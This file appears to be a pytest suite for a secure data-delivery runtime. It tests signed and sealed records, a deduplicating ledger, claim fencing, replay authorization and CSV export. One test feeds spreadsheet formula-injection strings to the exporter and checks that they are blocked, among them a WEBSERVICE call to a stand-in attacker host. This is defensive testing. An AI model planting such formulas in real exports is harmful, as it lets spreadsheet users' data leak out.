import json
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from pathlib import Path

import pytest

import polymorph.filesystem as filesystem
from polymorph.agents import (
    BlindDestinationAgent,
    BlindSourceAgent,
    BlindTransportRecord,
    PayloadCodec,
    SealedField,
)
from polymorph.audit import AuditLog
from polymorph.capabilities import (
    CapabilityAuthorizer,
    CapabilityGrant,
    CapabilityOperation,
    SignedCapabilityGrant,
)
from polymorph.connectors.base import ConnectorCapabilities, DeliveryContext
from polymorph.connectors.csv_file import CsvConnector
from polymorph.connectors.json_file import JsonFileConnector
from polymorph.crypto import RecipientKeyPair, seal_for_recipient
from polymorph.errors import IntegrityError, PolicyViolation
from polymorph.ledger import ClaimDisposition, DeliveryLedger, DeliveryState
from polymorph.models.mapping import MappingPlan, MappingRule
from polymorph.models.schema import FieldDescriptor, SchemaDescriptor
from polymorph.models.types import DataType, Sensitivity
from polymorph.runtime import AuditWriteStatus, DeliveryStatus, DestinationRuntime
from polymorph.signing import SigningKeyPair, SourceTrustStore, TrustedSourceKey
from polymorph.spool import SealedSpool


class MemoryDestination:
    capabilities = ConnectorCapabilities(write_records=True)

    def __init__(self):
        self.records = []
        self.calls = 0

    def inspect_schema(self):
        raise NotImplementedError

    def write_records(self, records, *, context: DeliveryContext | None = None):
        self.calls += 1
        materialized = list(records)
        self.records.extend(materialized)
        return len(materialized)


class FailAfterWriteDestination(MemoryDestination):
    def write_records(self, records, *, context: DeliveryContext | None = None):
        super().write_records(records, context=context)
        raise RuntimeError("simulated lost acknowledgement")


class IdempotentFailOnceDestination(MemoryDestination):
    capabilities = ConnectorCapabilities(write_records=True, supports_idempotency=True)

    def __init__(self):
        super().__init__()
        self.seen = set()
        self.fail_once = True

    def write_records(self, records, *, context: DeliveryContext | None = None):
        assert context is not None
        self.calls += 1
        materialized = list(records)
        if context.idempotency_key not in self.seen:
            self.seen.add(context.idempotency_key)
            self.records.extend(materialized)
        if self.fail_once:
            self.fail_once = False
            raise RuntimeError("simulated lost acknowledgement")
        return len(materialized)


class MutableClock:
    def __init__(self) -> None:
        self.current = datetime(2026, 1, 1, tzinfo=UTC)

    def __call__(self) -> datetime:
        return self.current

    def advance(self, delta: timedelta) -> None:
        self.current += delta


def test_audit_append_failure_is_visible_without_retrying_committed_write(
    tmp_path, monkeypatch
) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    audit = AuditLog(tmp_path / "audit.db")

    def fail_append(_event):
        raise OSError("simulated audit disk failure")

    monkeypatch.setattr(audit, "append", fail_append)
    runtime.audit = audit

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.DELIVERED
    assert not receipt.audit_recorded
    assert receipt.audit_status is AuditWriteStatus.APPEND_FAILED
    assert destination.calls == 1
    assert runtime.ledger.get(record).state is DeliveryState.COMMITTED


def _transport(secret: str = "s3cr3t"):
    source = SchemaDescriptor(
        "source",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    plan = MappingPlan(
        "plan",
        source.id,
        target.id,
        source.fingerprint(),
        target.fingerprint(),
        (MappingRule("token", "token", "opaque_forward"),),
    )
    keys = RecipientKeyPair.generate()
    signer = SigningKeyPair.generate()
    record = BlindSourceAgent(
        tenant="tenant",
        source_connector_id="excel",
        destination_connector_id="db",
        source_schema=source,
        target_schema=target,
        plan=plan,
        destination_public_key=keys.public_bytes(),
        signing_key=signer,
        allow_unauthenticated_recipient_key=True,
    ).prepare_record({"token": secret}, record_id="r1", transfer_id="t1")
    trust = SourceTrustStore([TrustedSourceKey(signer.public_bytes(), "tenant", "excel")])
    return record, keys, plan, trust


def _runtime(tmp_path: Path, destination):
    record, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    runtime = DestinationRuntime(
        connector_id="db",
        agent=BlindDestinationAgent(
            keys.private_key,
            expected_tenant="tenant",
            expected_connector_id="db",
            allowed_plan_digests=frozenset({plan.digest()}),
            source_trust_store=trust,
        ),
        connector=destination,
        ledger=DeliveryLedger(tmp_path / "ledger.db"),
        spool=SealedSpool(tmp_path / "spool.db"),
        plan=plan,
        target_schema=target,
    )
    return record, runtime


def _typed_runtime(
    tmp_path: Path,
    value: object,
    target_type: DataType,
    *,
    nullable: bool = True,
):
    source = SchemaDescriptor("source", (FieldDescriptor("value", "Value"),))
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("value", "Value", target_type, nullable=nullable),),
    )
    plan = MappingPlan(
        "typed-plan",
        source.id,
        target.id,
        source.fingerprint(),
        target.fingerprint(),
        (MappingRule("value", "value"),),
    )
    keys = RecipientKeyPair.generate()
    signer = SigningKeyPair.generate()
    trust = SourceTrustStore([TrustedSourceKey(signer.public_bytes(), "tenant", "source")])
    record = BlindSourceAgent(
        tenant="tenant",
        source_connector_id="source",
        destination_connector_id="db",
        source_schema=source,
        target_schema=target,
        plan=plan,
        destination_public_key=keys.public_bytes(),
        signing_key=signer,
        allow_unauthenticated_recipient_key=True,
    ).prepare_record({"value": value}, record_id="r1", transfer_id="t1")
    destination = MemoryDestination()
    agent = BlindDestinationAgent(
        keys.private_key,
        expected_tenant="tenant",
        expected_connector_id="db",
        source_trust_store=trust,
    )
    runtime = DestinationRuntime(
        connector_id="db",
        agent=agent,
        connector=destination,
        ledger=DeliveryLedger(tmp_path / "typed-ledger.db"),
        spool=SealedSpool(tmp_path / "typed-spool.db"),
        plan=plan,
        target_schema=target,
    )
    return record, runtime, destination


def test_runtime_delivers_once_and_deduplicates(tmp_path):
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    first = runtime.deliver(record)
    second = runtime.deliver(record)

    assert first.status is DeliveryStatus.DELIVERED
    assert second.status is DeliveryStatus.DUPLICATE
    assert destination.calls == 1
    assert destination.records == [{"token": "s3cr3t"}]


def test_json_post_publish_cleanup_failure_cannot_trigger_duplicate_retry(
    tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = tmp_path / "destination.json"
    record, runtime = _runtime(tmp_path, JsonFileConnector(target))
    real_unlink = filesystem.os.unlink

    def fail_temporary_cleanup(path) -> None:
        if Path(path).name.startswith(f".{target.name}."):
            raise PermissionError("simulated post-publish cleanup failure")
        real_unlink(path)

    monkeypatch.setattr(filesystem.os, "unlink", fail_temporary_cleanup)
    first = runtime.deliver(record)
    monkeypatch.setattr(filesystem.os, "unlink", real_unlink)
    second = runtime.deliver(record)

    assert first.status is DeliveryStatus.DELIVERED
    assert second.status is DeliveryStatus.DUPLICATE
    assert json.loads(target.read_text(encoding="utf-8")) == [{"token": "s3cr3t"}]
    for leftover in tmp_path.glob(f".{target.name}.*"):
        leftover.unlink()


def test_runtime_pins_unrestricted_agent_to_exact_plan(tmp_path) -> None:
    record, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    agent = BlindDestinationAgent(
        keys.private_key,
        expected_tenant="tenant",
        allowed_plan_digests=None,
        source_trust_store=trust,
    )

    DestinationRuntime(
        connector_id="db",
        agent=agent,
        connector=MemoryDestination(),
        ledger=DeliveryLedger(tmp_path / "ledger.db"),
        spool=SealedSpool(tmp_path / "spool.db"),
        plan=plan,
        target_schema=target,
    )

    assert agent.allowed_plan_digests == frozenset({record.plan_digest})
    assert agent.expected_connector_id == "db"


def test_runtime_narrows_broader_plan_allowlist_but_preserves_denial(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    broader_agent = BlindDestinationAgent(
        keys.private_key,
        allowed_plan_digests=frozenset({plan.digest(), "another-plan"}),
        source_trust_store=trust,
    )

    DestinationRuntime(
        connector_id="db",
        agent=broader_agent,
        connector=MemoryDestination(),
        ledger=DeliveryLedger(tmp_path / "broader-ledger.db"),
        spool=SealedSpool(tmp_path / "broader-spool.db"),
        plan=plan,
        target_schema=target,
    )
    assert broader_agent.allowed_plan_digests == frozenset({plan.digest()})

    denying_agent = BlindDestinationAgent(
        keys.private_key,
        allowed_plan_digests=frozenset(),
        source_trust_store=trust,
    )
    with pytest.raises(ValueError, match="not authorized"):
        DestinationRuntime(
            connector_id="db",
            agent=denying_agent,
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "denied-ledger.db"),
            spool=SealedSpool(tmp_path / "denied-spool.db"),
            plan=plan,
            target_schema=target,
        )


def test_runtime_rejects_plan_target_contract_drift(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    drifted_target = SchemaDescriptor(
        "target",
        (
            FieldDescriptor(
                "token",
                "API Token",
                DataType.STRING,
                sensitivity=Sensitivity.SECRET,
            ),
        ),
    )

    with pytest.raises(ValueError, match="fingerprint"):
        DestinationRuntime(
            connector_id="db",
            agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "ledger.db"),
            spool=SealedSpool(tmp_path / "spool.db"),
            plan=plan,
            target_schema=drifted_target,
        )


def test_runtime_rejects_plan_target_schema_id_mismatch(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    wrong_target = SchemaDescriptor(
        "different-target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )

    with pytest.raises(ValueError, match="ids differ"):
        DestinationRuntime(
            connector_id="db",
            agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "ledger.db"),
            spool=SealedSpool(tmp_path / "spool.db"),
            plan=plan,
            target_schema=wrong_target,
        )


def test_runtime_rejects_unmapped_required_target_before_delivery(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (
            FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),
            FieldDescriptor("required", "Required", nullable=False),
        ),
    )
    rebound_plan = MappingPlan(
        plan.id,
        plan.source_schema_id,
        target.id,
        plan.source_fingerprint,
        target.fingerprint(),
        plan.rules,
    )

    with pytest.raises(ValueError, match="required target"):
        DestinationRuntime(
            connector_id="db",
            agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "ledger.db"),
            spool=SealedSpool(tmp_path / "spool.db"),
            plan=rebound_plan,
            target_schema=target,
        )


def test_runtime_allows_explicit_destination_generated_target(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (
            FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),
            FieldDescriptor(
                "generated_id",
                "Generated ID",
                nullable=False,
                destination_generated=True,
            ),
        ),
    )
    rebound_plan = MappingPlan(
        plan.id,
        plan.source_schema_id,
        target.id,
        plan.source_fingerprint,
        target.fingerprint(),
        plan.rules,
    )

    DestinationRuntime(
        connector_id="db",
        agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
        connector=MemoryDestination(),
        ledger=DeliveryLedger(tmp_path / "ledger.db"),
        spool=SealedSpool(tmp_path / "spool.db"),
        plan=rebound_plan,
        target_schema=target,
    )


@pytest.mark.parametrize(
    ("target_type", "value", "expected_status"),
    (
        (DataType.STRING, 7, DeliveryStatus.QUARANTINED),
        (DataType.INTEGER, Decimal("7"), DeliveryStatus.QUARANTINED),
        (DataType.DECIMAL, 7, DeliveryStatus.DELIVERED),
        (DataType.UNKNOWN, {"anything": [1, 2]}, DeliveryStatus.DELIVERED),
    ),
)
def test_runtime_enforces_conservative_target_types(
    tmp_path,
    target_type,
    value,
    expected_status,
) -> None:
    record, runtime, destination = _typed_runtime(tmp_path, value, target_type)

    receipt = runtime.deliver(record)

    assert receipt.status is expected_status
    if expected_status is DeliveryStatus.QUARANTINED:
        assert receipt.reason_code == "destination_contract_failed"
        assert destination.calls == 0
    else:
        assert destination.calls == 1


@pytest.mark.parametrize("value", (Decimal("NaN"), Decimal("Infinity"), float("inf")))
def test_runtime_unknown_type_still_rejects_non_finite_numbers(value: object) -> None:
    assert not DestinationRuntime._value_satisfies_type(value, DataType.UNKNOWN)


def test_runtime_rejects_authenticated_non_finite_payload_before_write(tmp_path) -> None:
    record, runtime, destination = _typed_runtime(
        tmp_path,
        "placeholder",
        DataType.UNKNOWN,
    )
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    original = record.fields[0]
    envelope = seal_for_recipient(
        b'{"kind":"decimal","value":"NaN"}',
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        original.context,
    )
    malicious = BlindTransportRecord(
        record.record_id,
        (SealedField(original.target_field_id, original.context, envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malicious)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "transport_verification_failed"
    assert destination.calls == 0


@pytest.mark.parametrize(
    "value",
    ('=WEBSERVICE("https://attacker.invalid/x")', "+1+1", "-1+1", "@SUM(1+1)"),
)
def test_runtime_csv_export_blocks_spreadsheet_formula_injection(tmp_path, value) -> None:
    record, runtime, _ = _typed_runtime(tmp_path, value, DataType.STRING)
    output = tmp_path / "export.csv"
    runtime.connector = CsvConnector(output)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "write_not_committed"
    assert receipt.retry_safe
    assert not output.exists()


def test_runtime_rejects_null_for_required_mapped_target(tmp_path) -> None:
    record, runtime, destination = _typed_runtime(
        tmp_path,
        None,
        DataType.STRING,
        nullable=False,
    )

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert destination.calls == 0


def test_runtime_rejects_authenticated_wrong_field_set_before_write(tmp_path) -> None:
    record, runtime = _runtime(tmp_path, MemoryDestination())
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    original = record.fields[0]
    context = replace(original.context, field_id="unexpected")
    envelope = seal_for_recipient(
        PayloadCodec.encode("must-not-be-written"),
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        context,
    )
    malformed = BlindTransportRecord(
        record.record_id,
        (SealedField("unexpected", context, envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malformed)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert runtime.connector.calls == 0
    assert runtime.ledger.get(malformed).state is DeliveryState.QUARANTINED


def test_runtime_rejects_authenticated_wrong_plan_id_before_write(tmp_path) -> None:
    record, runtime = _runtime(tmp_path, MemoryDestination())
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    original = record.fields[0]
    context = replace(original.context, plan_id="different-plan")
    envelope = seal_for_recipient(
        PayloadCodec.encode("must-not-be-written"),
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        context,
    )
    malformed = BlindTransportRecord(
        record.record_id,
        (SealedField(original.target_field_id, context, envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malformed)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert runtime.connector.calls == 0


def test_unknown_write_outcome_is_sealed_and_not_blindly_retried(tmp_path):
    destination = FailAfterWriteDestination()
    record, runtime = _runtime(tmp_path, destination)

    result = runtime.deliver(record)
    assert result.status is DeliveryStatus.QUARANTINED
    assert result.reason_code == "write_outcome_unknown"
    assert runtime.ledger.get(record).state is DeliveryState.UNCERTAIN
    assert runtime.spool.get(record.digest()) is not None

    with pytest.raises(PolicyViolation):
        runtime.replay(record.digest())

    # Neither the spool nor ledger persist the plaintext token.
    for path in tmp_path.iterdir():
        if path.is_file():
            assert b"s3cr3t" not in path.read_bytes()


def test_forced_uncertain_replay_requires_explicit_capability_authorizer(tmp_path) -> None:
    destination = FailAfterWriteDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.deliver(record)

    with pytest.raises(PolicyViolation, match="explicit capability authorizer"):
        runtime.replay(record.digest(), force_uncertain=True)

    assert destination.calls == 1
    assert runtime.ledger.get(record).state is DeliveryState.UNCERTAIN
    assert runtime.spool.get(record.digest()) is not None


def test_idempotent_destination_can_safely_replay_uncertain_delivery(tmp_path):
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)

    first = runtime.deliver(record)
    assert first.status is DeliveryStatus.QUARANTINED
    assert first.retry_safe

    replay = runtime.replay(record.digest())
    assert replay.status is DeliveryStatus.DELIVERED
    assert destination.calls == 2
    assert destination.records == [{"token": "s3cr3t"}]


def test_known_not_committed_write_is_safe_to_replay(tmp_path) -> None:
    from polymorph.errors import ConnectorWriteError, WriteOutcome

    class KnownRollbackConnector(MemoryDestination):
        def __init__(self) -> None:
            super().__init__()
            self.fail_once = True

        def write_records(self, records, *, context=None):
            if self.fail_once:
                self.fail_once = False
                raise ConnectorWriteError(
                    "rolled back",
                    outcome=WriteOutcome.NOT_COMMITTED,
                )
            return super().write_records(records, context=context)

    connector = KnownRollbackConnector()
    transport, runtime = _runtime(tmp_path, connector)
    receipt = runtime.deliver(transport)
    assert receipt.reason_code == "write_not_committed"
    assert receipt.retry_safe is True
    runtime.audit = AuditLog(tmp_path / "replay-audit.db")
    replayed = runtime.replay(transport.digest(), force_uncertain=True)
    assert replayed.status is DeliveryStatus.DELIVERED
    assert len(connector.records) == 1
    assert runtime.audit.summary().event_types == {"replay": 1}


def test_json_limit_rejection_is_not_marked_as_an_uncertain_write(tmp_path) -> None:
    path = tmp_path / "destination.json"
    connector = JsonFileConnector(path, max_json_items=2)
    assert connector.write_records([{"token": "already-committed"}]) == 1
    committed = path.read_bytes()
    record, runtime = _runtime(tmp_path, connector)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "write_not_committed"
    assert receipt.retry_safe
    assert runtime.ledger.get(record).state is DeliveryState.QUARANTINED
    assert runtime.spool.get(record.digest()) is not None
    assert path.read_bytes() == committed


def test_validly_signed_malformed_payload_is_quarantined_without_write(tmp_path) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    field = record.fields[0]
    malformed_envelope = seal_for_recipient(
        b"not-json",
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        field.context,
    )
    malformed = BlindTransportRecord(
        record.record_id,
        (SealedField(field.target_field_id, field.context, malformed_envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malformed)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "transport_verification_failed"
    assert destination.calls == 0
    assert runtime.ledger.get(malformed).state is DeliveryState.QUARANTINED
    assert runtime.spool.get(malformed.digest()) is not None


def test_expired_prewrite_claim_is_recovered_and_delivered_once(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=30)

    abandoned = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert abandoned.disposition is ClaimDisposition.NEW
    assert abandoned.claim_token is not None

    clock.advance(timedelta(seconds=31))
    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1
    assert destination.records == [{"token": "s3cr3t"}]
    assert runtime.ledger.get(record).state is DeliveryState.COMMITTED


def test_active_prewrite_claim_is_not_stolen_or_quarantined(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(minutes=1)
    runtime.ledger.claim(record, lease_for=runtime.claim_lease)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "delivery_claim_in_progress"
    assert not receipt.retry_safe
    assert destination.calls == 0
    assert runtime.spool.get(record.digest()) is None
    assert runtime.ledger.get(record).state is DeliveryState.CLAIMED


def test_replaced_claim_fences_stale_worker_before_destination_write(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=20)

    stale = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert stale.claim_token is not None
    clock.advance(timedelta(seconds=21))
    replacement = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert replacement.disposition is ClaimDisposition.RECOVERED
    assert replacement.claim_token is not None
    assert replacement.claim_token != stale.claim_token

    stale_result = runtime._deliver_claimed(record, stale.claim_token)
    assert stale_result.status is DeliveryStatus.AMBIGUOUS
    assert stale_result.reason_code == "delivery_claim_lost"
    assert destination.calls == 0

    replacement_result = runtime._deliver_claimed(record, replacement.claim_token)
    assert replacement_result.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1


def test_write_started_claim_is_never_recovered_by_elapsed_time(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=10)

    claim = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert claim.claim_token is not None
    runtime.ledger.start_write(record, claim.claim_token)
    clock.advance(timedelta(days=7))

    repeated = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert repeated.disposition is ClaimDisposition.AMBIGUOUS
    assert repeated.state is DeliveryState.WRITE_STARTED

    receipt = runtime.deliver(record)
    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_write_started_ambiguous"
    assert destination.calls == 0
    assert runtime.spool.get(record.digest()) is not None

    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())
    assert destination.calls == 0


def test_crash_after_destination_commit_does_not_trigger_blind_second_write(
    tmp_path,
    monkeypatch,
) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    def crash_before_outcome(*_args: object, **_kwargs: object) -> None:
        raise SystemExit("simulated process death")

    monkeypatch.setattr(runtime.ledger, "mark_committed", crash_before_outcome)
    with pytest.raises(SystemExit, match="simulated process death"):
        runtime.deliver(record)

    assert destination.calls == 1
    assert destination.records == [{"token": "s3cr3t"}]
    assert runtime.ledger.get(record).state is DeliveryState.WRITE_STARTED

    receipt = runtime.deliver(record)
    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_write_started_ambiguous"
    assert destination.calls == 1


def test_write_started_recovery_requires_explicit_force_capability(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    claim = runtime.ledger.claim(record)
    assert claim.claim_token is not None
    runtime.ledger.start_write(record, claim.claim_token)
    runtime.deliver(record)

    with pytest.raises(PolicyViolation, match="explicit capability authorizer"):
        runtime.replay(record.digest(), force_uncertain=True)

    signer = SigningKeyPair.generate()
    replay_only = CapabilityGrant.issue(
        issuer="operator",
        subject=runtime.actor_id,
        tenant=record.tenant,
        connector_id=runtime.connector_id,
        operations=(CapabilityOperation.REPLAY,),
        allowed_plan_digests=(record.plan_digest,),
    )
    runtime.authorizer = CapabilityAuthorizer(
        SignedCapabilityGrant.sign(replay_only, signer),
        signer.public_bytes(),
        subject=runtime.actor_id,
        expected_issuer="operator",
    )
    with pytest.raises(PolicyViolation, match="force_uncertain_replay"):
        runtime.replay(record.digest(), force_uncertain=True)

    grant = CapabilityGrant.issue(
        issuer="operator",
        subject=runtime.actor_id,
        tenant=record.tenant,
        connector_id=runtime.connector_id,
        operations=(
            CapabilityOperation.REPLAY,
            CapabilityOperation.FORCE_UNCERTAIN_REPLAY,
        ),
        allowed_plan_digests=(record.plan_digest,),
    )
    runtime.authorizer = CapabilityAuthorizer(
        SignedCapabilityGrant.sign(grant, signer),
        signer.public_bytes(),
        subject=runtime.actor_id,
        expected_issuer="operator",
    )
    runtime.audit = AuditLog(tmp_path / "audit.db")

    receipt = runtime.replay(record.digest(), force_uncertain=True)
    assert receipt.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1
    assert runtime.audit.summary().event_types == {"force_replay": 1}


def test_legacy_unfenced_claim_fails_closed(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.ledger.claim(record)
    with runtime.ledger._connect() as connection:
        connection.execute("UPDATE deliveries SET claim_token = NULL, claim_expires_at = NULL")

    clock.advance(timedelta(days=30))
    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_delivery_ambiguous"
    assert destination.calls == 0
    assert runtime.ledger.get(record).state is DeliveryState.CLAIMED
    assert runtime.spool.get(record.digest()) is not None


def test_claim_transition_rejects_expired_and_wrong_fence_tokens(tmp_path) -> None:
    clock = MutableClock()
    record, _, _, _ = _transport()
    ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    claim = ledger.claim(record, lease_for=timedelta(seconds=5))
    assert claim.claim_token is not None

    with pytest.raises(IntegrityError, match="state transition"):
        ledger.start_write(record, "attacker-token")

    clock.advance(timedelta(seconds=6))
    with pytest.raises(IntegrityError, match="state transition"):
        ledger.start_write(record, claim.claim_token)
    assert ledger.get(record).state is DeliveryState.CLAIMED
